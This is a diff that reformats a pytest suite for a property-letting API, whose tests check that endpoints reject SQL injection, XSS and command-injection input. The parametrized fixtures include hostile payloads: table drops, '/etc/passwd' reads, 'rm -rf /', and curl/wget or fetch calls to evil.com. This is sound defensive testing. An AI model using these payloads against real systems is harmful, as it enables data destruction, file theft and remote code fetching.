@@ -18,23 +18,25 @@ from fastapi.testclient import TestClient
 class TestSQLInjectionRejection:
     """Test that API endpoints reject SQL injection attempts."""
 
-    @pytest.mark.parametrize("sql_payload", [
-        "'; DROP TABLE properties; --",
-        "' OR '1'='1",
-        "1' UNION SELECT * FROM users--",
-        "admin'--",
-        "' OR 1=1--",
-        "1'; DELETE FROM landlords WHERE '1'='1",
-        "'; UPDATE properties SET rent_pcm=0; --",
-    ])
+    @pytest.mark.parametrize(
+        "sql_payload",
+        [
+            "'; DROP TABLE properties; --",
+            "' OR '1'='1",
+            "1' UNION SELECT * FROM users--",
+            "admin'--",
+            "' OR 1=1--",
+            "1'; DELETE FROM landlords WHERE '1'='1",
+            "'; UPDATE properties SET rent_pcm=0; --",
+        ],
+    )
     def test_property_search_rejects_sql_injection(
         self, client: TestClient, sql_payload: str
     ):
         """Property search endpoint should reject SQL injection in search parameters."""
         # FR-028: Verify SQL injection attempt is rejected
         response = client.get(
-            "/api/v1/search/properties",
-            params={"postcode": sql_payload}
+            "/api/v1/search/properties", params={"postcode": sql_payload}
         )
 
         # Should return 400 or 422, not 200
@@ -47,11 +49,14 @@ class TestSQLInjectionRejection:
         data = response.json()
         assert "detail" in data or "error" in data
 
-    @pytest.mark.parametrize("sql_payload", [
-        "'; DROP TABLE applicants; --",
-        "1' OR '1'='1' --",
-        "test@example.com'; DELETE FROM applicants--",
-    ])
+    @pytest.mark.parametrize(
+        "sql_payload",
+        [
+            "'; DROP TABLE applicants; --",
+            "1' OR '1'='1' --",
+            "test@example.com'; DELETE FROM applicants--",
+        ],
+    )
     def test_applicant_creation_rejects_sql_injection(
         self, client: TestClient, sql_payload: str
     ):
@@ -66,7 +71,7 @@ class TestSQLInjectionRejection:
                 "rent_budget_min": 1000,  # Correct schema field
                 "rent_budget_max": 2000,  # Correct schema field
                 "bedrooms_min": 1,
-            }
+            },
         )
 
         # Should reject with 400/422
@@ -75,9 +80,7 @@ class TestSQLInjectionRejection:
             f"Got status {response.status_code}"
         )
 
-    def test_property_creation_rejects_sql_in_address(
-        self, client: TestClient
-    ):
+    def test_property_creation_rejects_sql_in_address(self, client: TestClient):
         """Property creation should reject SQL injection in address fields."""
         # FR-028: SQL injection in property address
         response = client.post(
@@ -89,7 +92,7 @@ class TestSQLInjectionRejection:
                 "bedrooms": 2,
                 "bathrooms": 1,
                 "rent": 1500.0,  # Correct schema field
-            }
+            },
         )
 
         # Should reject
@@ -100,18 +103,19 @@ class TestSQLInjectionRejection:
 class TestXSSRejection:
     """Test that API endpoints reject XSS payloads."""
 
-    @pytest.mark.parametrize("xss_payload", [
-        "<script>alert('XSS')</script>",
-        "<img src=x onerror=alert('XSS')>",
-        "<iframe src='javascript:alert(1)'>",
-        "javascript:alert('XSS')",
-        "<svg onload=alert('XSS')>",
-        "<body onload=alert('XSS')>",
-        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
-    ])
-    def test_applicant_creation_rejects_xss(
-        self, client: TestClient, xss_payload: str
-    ):
+    @pytest.mark.parametrize(
+        "xss_payload",
+        [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<iframe src='javascript:alert(1)'>",
+            "javascript:alert('XSS')",
+            "<svg onload=alert('XSS')>",
+            "<body onload=alert('XSS')>",
+            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
+        ],
+    )
+    def test_applicant_creation_rejects_xss(self, client: TestClient, xss_payload: str):
         """Applicant creation should reject XSS payloads in name/comments."""
         # FR-029: XSS in applicant name
         response = client.post(
@@ -123,7 +127,7 @@ class TestXSSRejection:
                 "rent_budget_min": 1000,  # Correct schema field
                 "rent_budget_max": 2000,  # Correct schema field
                 "bedrooms_min": 1,
-            }
+            },
         )
 
         # Should reject with 400/422
@@ -132,11 +136,14 @@ class TestXSSRejection:
             f"Got status {response.status_code}"
         )
 
-    @pytest.mark.parametrize("xss_payload", [
-        "<script>document.location='http://evil.com'</script>",
-        "<a href='javascript:void(0)'>click</a>",
-        "<img src=x onerror=fetch('http://evil.com')>",
-    ])
+    @pytest.mark.parametrize(
+        "xss_payload",
+        [
+            "<script>document.location='http://evil.com'</script>",
+            "<a href='javascript:void(0)'>click</a>",
+            "<img src=x onerror=fetch('http://evil.com')>",
+        ],
+    )
     def test_property_description_rejects_xss(
         self, client: TestClient, xss_payload: str
     ):
@@ -152,7 +159,7 @@ class TestXSSRejection:
                 "bathrooms": 1,
                 "rent": 1500.0,  # Correct schema field
                 "description": xss_payload,
-            }
+            },
         )
 
         # Should reject
@@ -161,13 +168,14 @@ class TestXSSRejection:
             f"Got status {response.status_code}"
         )
 
-    @pytest.mark.parametrize("xss_payload", [
-        "Test<script>alert(1)</script>Company",
-        "Evil Corp<iframe src='javascript:alert(1)'>",
-    ])
-    def test_landlord_creation_rejects_xss(
-        self, client: TestClient, xss_payload: str
-    ):
+    @pytest.mark.parametrize(
+        "xss_payload",
+        [
+            "Test<script>alert(1)</script>Company",
+            "Evil Corp<iframe src='javascript:alert(1)'>",
+        ],
+    )
+    def test_landlord_creation_rejects_xss(self, client: TestClient, xss_payload: str):
         """Landlord creation should reject XSS in full name."""
         # FR-029: XSS in landlord full name
         response = client.post(
@@ -179,7 +187,7 @@ class TestXSSRejection:
                 "bank_account_name": "John Doe",  # Correct schema field
                 "sort_code": "12-34-56",  # Correct schema field
                 "account_number": "12345678",  # Correct schema field
-            }
+            },
         )
 
         # Should reject
@@ -190,25 +198,25 @@ class TestXSSRejection:
 class TestCommandInjectionRejection:
     """Test that API endpoints reject command injection attempts."""
 
-    @pytest.mark.parametrize("cmd_payload", [
-        "; ls -la",
-        "| cat /etc/passwd",
-        "`whoami`",
-        "$(cat /etc/passwd)",
-        "; rm -rf /",
-        "& dir",
-        "&& ping 8.8.8.8",
-        "test; curl http://evil.com",
-    ])
+    @pytest.mark.parametrize(
+        "cmd_payload",
+        [
+            "; ls -la",
+            "| cat /etc/passwd",
+            "`whoami`",
+            "$(cat /etc/passwd)",
+            "; rm -rf /",
+            "& dir",
+            "&& ping 8.8.8.8",
+            "test; curl http://evil.com",
+        ],
+    )
     def test_search_rejects_command_injection(
         self, client: TestClient, cmd_payload: str
     ):
         """Search endpoints should reject command injection attempts."""
         # FR-030: Command injection in search query
-        response = client.get(
-            "/api/v1/search/properties",
-            params={"city": cmd_payload}
-        )
+        response = client.get("/api/v1/search/properties", params={"city": cmd_payload})
 
         # Should reject with 400/422
         assert response.status_code in (400, 422), (
@@ -216,11 +224,14 @@ class TestCommandInjectionRejection:
             f"Got status {response.status_code}"
         )
 
-    @pytest.mark.parametrize("cmd_payload", [
-        "test@example.com; wget http://evil.com/shell.sh",
-        "`curl evil.com`@example.com",
-        "test$(whoami)@example.com",
-    ])
+    @pytest.mark.parametrize(
+        "cmd_payload",
+        [
+            "test@example.com; wget http://evil.com/shell.sh",
+            "`curl evil.com`@example.com",
+            "test$(whoami)@example.com",
+        ],
+    )
     def test_email_fields_reject_command_injection(
         self, client: TestClient, cmd_payload: str
     ):
@@ -235,7 +246,7 @@ class TestCommandInjectionRejection:
                 "rent_budget_min": 1000,  # Correct schema field
                 "rent_budget_max": 2000,  # Correct schema field
                 "bedrooms_min": 1,
-            }
+            },
         )
 
         # Should reject (email validation should catch this)
@@ -258,7 +269,7 @@ class TestPydanticValidationRejection:
                 "rent_budget_min": 1000,  # Correct schema field
                 "rent_budget_max": 2000,  # Correct schema field
                 "bedrooms_min": 1,
-            }
+            },
         )
 
         # Pydantic email validator should reject
@@ -280,7 +291,7 @@ class TestPydanticValidationRejection:
                 "bedrooms": -2,  # Negative bedrooms (will be rejected by ge=0 constraint)
                 "bathrooms": 1,
                 "rent": 1500.0,  # Correct schema field
-            }
+            },
         )
 
         # Should reject negative bedrooms
@@ -298,7 +309,7 @@ class TestPydanticValidationRejection:
                 "bedrooms": 2,
                 "bathrooms": 1,
                 "rent": 1500.0,  # Correct schema field
-            }
+            },
         )
 
         # Property type accepts any string, so this will actually succeed
@@ -319,7 +330,7 @@ class TestPydanticValidationRejection:
                 "rent_budget_min": 1000,  # Correct schema field
                 "rent_budget_max": 2000,  # Correct schema field
                 "bedrooms_min": 1,
-            }
+            },
         )
 
         # Should reject or truncate (depends on schema constraints)
@@ -338,7 +349,7 @@ class TestPydanticValidationRejection:
                 "rent_budget_min": 1000,  # Correct schema field
                 "rent_budget_max": 2000,  # Correct schema field
                 "bedrooms_min": 1,
-            }
+            },
         )
 
         # Should reject or sanitize
@@ -353,6 +364,7 @@ class TestNoDatabaseSideEffects:
         """SQL injection attempts should not modify database."""
         # FR-031: Count properties before attack
         from app.models.property import Property
+
         initial_count = db.query(Property).count()
 
         # Attempt SQL injection that tries to delete all properties
@@ -365,7 +377,7 @@ class TestNoDatabaseSideEffects:
                 "bedrooms": 2,
                 "bathrooms": 1,
                 "rent": 1500.0,  # Correct schema field
-            }
+            },
         )
 
         # Count after attack - should be unchanged (or +1 if creation succeeded)
